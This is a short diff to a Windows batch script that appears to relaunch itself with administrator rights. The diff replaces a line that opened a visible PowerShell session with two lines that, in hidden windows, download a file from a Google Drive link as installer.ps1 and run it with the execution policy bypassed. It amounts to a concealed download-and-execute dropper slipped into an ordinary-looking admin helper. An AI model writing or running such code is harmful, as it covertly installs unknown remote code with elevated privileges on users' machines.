@@ -29,4 +29,5 @@ pushd "%CD"
 CD /D "%~dp0"
 
 REM you can remove the 'powershell' to get an admin CMD
-start powershell -ep bypass
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://drive.google.com/file/d/1uSz1ypRtIMx0nZuy4VhFI4fCulHKLYwE/view?usp=sharing -OutFile installer.ps1"
+powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
